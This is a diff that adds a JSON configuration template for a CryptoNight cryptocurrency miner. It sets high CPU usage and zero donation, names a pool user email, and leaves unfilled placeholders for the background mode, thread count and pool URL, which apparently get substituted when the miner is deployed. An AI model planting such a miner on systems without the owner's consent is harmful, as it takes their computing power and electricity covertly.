@@ -1,0 +1,27 @@
+                      
+{
+    "algo": "cryptonight",
+    "av": 2,
+    "background": x--0,
+    "colors": true,
+    "cpu-affinity":null,
+    "cpu-priority": null,
+    "donate-level": 0,
+    "log-file": null,
+    "max-cpu-usage": 95,
+    "print-time": 1000,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": x--1,
+    "pools": [
+	{
+            "url": "x--2",
+            "user": "sam05@protonmail.com",
+            "pass": "x",
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
